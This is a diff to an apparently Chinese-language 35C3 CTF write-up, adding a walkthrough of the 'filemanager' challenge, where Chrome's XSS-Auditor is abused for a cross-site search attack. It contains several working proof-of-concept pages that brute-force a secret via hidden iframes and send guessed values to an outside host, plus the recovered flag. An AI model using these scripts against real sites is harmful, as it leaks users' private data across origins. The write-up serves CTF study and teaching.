@@ -958,7 +958,9 @@ echo 'O:1:"B":1:{}' | nc 35.242.207.13 1
 
 ### filemanager
 
-漏洞代码:
+漏洞代码: 
+
+这里的`${q}`可以触发xss。
 
 ```
 <script>
@@ -984,7 +986,309 @@ javascript:
 
 反引号可以将字符串中的16进制，或者特殊符号转化
 
+TIPS:
 
+test.php:
+
+```
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+<body>
+        <?php
+ 
+            $password = @$_GET["password"];
+            if($password=='admin'){ // 这里模拟我们要猜测的值
+                echo "you get it." ;
+                echo "<script>let a='test';</script>";
+            }else{
+                echo "guess error!" ;
+            }
+        ?>
+ 
+</body>
+</html>
+```
+
+poc.html:
+
+```
+<html>
+<!--filename:poc.html -->
+<style>
+    iframe {
+        display: none;
+    }
+</style>
+<body>
+    <iframe id=f></iframe>
+    <div id=log></div>
+    <script>
+       var myframes = [];
+            function go(x) {
+                var f = document.createElement('iframe');
+                myframes.push(f);
+                document.body.appendChild(f)
+                var start = performance.now()
+                f.onload = function() {
+                    f.onload = function() {
+                        console.log("second request!");
+                    }
+                    console.log("first request!");
+                    f.src=f.src+'#';
+                }
+                f.src = `http://192.168.21.149/test.php?password=${encodeURIComponent(x)}&<script>let%20a=%27test%27;<\/script>`;
+            }
+            var payload1 = 'admin';
+            var payload2 = 'test';
+            go(payload1);
+            go(payload2);
+        </script>
+</body>
+</html>
+```
+
+请求Poc.html:
+
+![](/assets/35c3/TIM截图20190103102155.png)
+
+总共发送了3次请求
+
+```
+f.onload = function() {
+            f.onload = function() {
+               console.log("second request!");
+            }
+            console.log("first request!");
+            f.src=f.src+'#';
+}
+```
+
+这里在url后边加上`#`，浏览器认为url没有修改，所以不会再次重新请求，所以应该是2次请求，出现3次的原因是，`XSS-Autidor`拦截之后，浏览器认为页面没有加载成功，所以在url后边添加一个`#`之后，浏览器会在请求一次。
+
+日志如下:
+
+```
+192.168.21.1 - - [03/Jan/2019:10:14:11 +0800] "GET /test.php?password=admin&%3Cscript%3Elet%20a=%27test%27;%3C/script%3E HTTP/1.1" 200 241 "http://192.168.21.149/poc.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
+192.168.21.1 - - [03/Jan/2019:10:14:11 +0800] "GET /test.php?password=test&%3Cscript%3Elet%20a=%27test%27;%3C/script%3E HTTP/1.1" 200 224 "http://192.168.21.149/poc.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
+192.168.21.1 - - [03/Jan/2019:10:14:12 +0800] "GET /test.php?password=admin&%3Cscript%3Elet%20a=%27test%27;%3C/script%3E HTTP/1.1" 200 241 "http://192.168.21.149/poc.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
+```
+
+`password=admin`会触发`XSS-Auditor`，利用这一点可以实现bool盲注的效果。
+
+回到题目上来:
+
+随便创建一个文件:
+
+![](/assets/35c3/TIM截图20190103110323.png)
+
+name: abc         content: def
+
+访问url:
+
+```
+https://filemanager.appspot.com/search?q=d&a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b
+```
+
+也就是搜索`d`:
+
+可以看到XSS-Auditor检测到了攻击:
+
+![](/assets/35c3/TIM截图20190103110546.png)
+
+查看源码:
+
+![](/assests/35c3/TIM截图20190103110637.png)
+
+js代码变成了红色，也说明XSS-Auditor检测到攻击。
+
+通过题目可以知道flag以文件的形式保存在管理员的账号中，并且flag的形式为35c3_****。
+
+这样，当我们搜索文件的时候，便可以搜索到flag。
+
+注意:
+
+* To clarify: `a` is just foo parameter name, we just wanna make XSS-Auditor see it's as XSS vector.
+
+参考文章或链接:
+
+```
+<body>
+<!--
+Briefly, we all know that flag is stored as `file` in admin account. Plus, the flag is in the format: 35C3_***
+When we searching content of a file, if it does exists, there is a script which doing highlight the found word by yellow <mark>
+For example: https://filemanager.appspot.com/search?q=def
+  <h1>abc</h1>
+  <pre>def</pre>
+  
+  <script>
+    (()=>{
+      for (let pre of document.getElementsByTagName('pre')) {
+        let text = pre.innerHTML;
+        let q = 'def';
+        let idx = text.indexOf(q);
+        pre.innerHTML = `${text.substr(0, idx)}<mark>${q}</mark>${text.substr(idx+q.length)}`;
+      }
+    })();
+  </script>
+Okay, now let's go to XSS Auditor part.
+Try this on Chrome (yea we should, since the description saying that the admin is using Chrome-headless)
+view-source:https://filemanager.appspot.com/search?q=def&a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b
+You can see the red alert, which means that XSS-Auditor found a XSS vector on our URL (`a` param) which also showing in the page's content. But in fact, it's *NOT XSS* , this is side effect of the auditor
+We leverage on its mechanism to detect whether there is search result (guessing flag) or not.
+* To clarify: `a` is just foo parameter name, we just wanna make XSS-Auditor see it's as XSS vector.
+But how do we do that ? Since XSS-Auditor will detect and block the page, redirect the page to `chrome-error://chromewebdata/` as well.
+Now the trick comes by. by reading this post: https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning
+I found out, it's possible to detect if the browser redirects to other page.
+Yep, and that's all.
+We can guess the flag by performing XS-Search leverage on XSS-Auditor 
+-->
+<script>
+		var URL = 'https://filemanager.appspot.com/search?q={{search}}&a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b';
+		var charset = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^`{|}~';
+		var brute = new URLSearchParams(location.search).get('brute') || '35C3_';
+		function guess(i){
+			var go = brute + charset[i];
+			var x = document.createElement('iframe');
+			x.name = 'blah';
+			var calls = 0;
+			x.onload = () => {
+				calls++;
+				if(calls > 1){ 
+					// so here is calling 2nd onload which means the xss auditor blocking this and the page is redirected to chrome-error://
+					// https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning
+					console.log("GO IT ==> ",go);
+					location.href = 'http://deptrai.l4w.pw/35c3/go.html?brute='+escape(go);
+					x.onload = ()=>{};
+				}
+				var anchor = document.createElement('a');
+				anchor.target = x.name;
+				anchor.href = x.src+'#';
+				anchor.click();
+				anchor = null;
+			}
+			x.src = URL.replace('{{search}}',go);
+			document.body.appendChild(x);
+			setTimeout(() =>{
+				document.body.removeChild(x);
+				guess(i+1);
+			},1000);
+		}
+		guess(0);
+		// FLAG: 35C3_xss_auditor_for_the_win
+</script>
+
+</body>
+```
+
+* https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning
+* https://xz.aliyun.com/t/3241       上一篇文章的中文版
+
+POC：
+
+poc.html:
+
+```
+<style>
+iframe {
+    display: none;
+}
+</style>
+<iframe id=f></iframe>
+<div id=log></div>
+<script>
+    var flag = '35C3_xss_auditor_for_th';
+    var _keys_ = '0123456789[] abcdefghijklmnopqrstuvwxyz{}ABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&*()';
+    var myframes = [];
+
+    function go(x) {
+        var f = document.createElement('iframe');
+        myframes.push(f);
+        document.body.appendChild(f)
+        var start = performance.now()
+        f.onload = function() {
+            f.onload = function() {
+                console.log(log.innerHTML = 'hit! ' + x + '<br>')
+                fetch('/?flag='+x+'&'+Math.random())
+                myframes.map(f => document.body.removeChild(f))
+                myframes.length = 0
+                flag = x;
+                exploit()
+            }
+            f.src=f.src+'#';
+        }
+        f.src = `https://filemanager.appspot.com/search?q=${encodeURIComponent(x)}&%0A%20%20<script>%0A%20%20%20%20%28%28%29%3D>%7B%0A%20%20%20%20%20%20for%20%28let%20pre%20of%20document.getElementsByTagName%28%27pre%27%29%29%20%7B%0A%20%20%20%20%20%20%20%20let%20text%20%3D%20pre.innerHTML%3B`;
+    }
+    function exploit() {
+        for(var i = 0; i < _keys_.length; i++) {
+            go(flag + _keys_[i])
+        }
+    }
+    exploit()
+
+    // navigator.serviceWorker.register('/xs-search.js');
+</script>
+```
+
+poc1.html:
+
+```
+<html>
+<body>
+<h1>haha</h1>
+<script>
+        var URL = 'https://filemanager.appspot.com/search?q={{search}}&a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b';
+        var charset = '_abcdefghijklmnopqrstuvwxyz';
+        var brute = new URLSearchParams(location.search).get('brute') || '35C3_';
+        function guess(i){
+            var go = brute + charset[i];
+            var x = document.createElement('iframe');
+            x.name = 'blah';
+            var calls = 0;
+            x.onload = () => {
+                calls++;
+                if(calls > 1){ 
+                    // so here is calling 2nd onload which means the xss auditor blocking this and the page is redirected to chrome-error://
+                    // https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning
+                    console.log("GO IT ==> ",go);
+                    location.href = 'http://deptrai.l4w.pw/35c3/go.html?brute='+escape(go);
+                    x.onload = ()=>{};
+                }
+                var anchor = document.createElement('a');
+                anchor.target = x.name;
+                anchor.href = x.src+'#';
+                anchor.click();
+                anchor = null;
+            }
+            x.src = URL.replace('{{search}}',go);
+            document.body.appendChild(x);
+            setTimeout(() =>{
+                document.body.removeChild(x);
+                guess(i+1);
+            },1000);
+        }
+        guess(0);
+        // FLAG: 35C3_xss_auditor_for_the_win
+</script>
+</body>
+</html>
+```
+
+### post
+
+https://github.com/eboda/35c3.git
+
+## pwn&others
+
+* https://github.com/bkth/35c3ctf.git
+* https://github.com/saelo/35c3ctf.git
+* https://github.com/tharina/35c3ctf.git
+* https://github.com/niklasb/35c3ctf-challs.git
 
 # check 
 
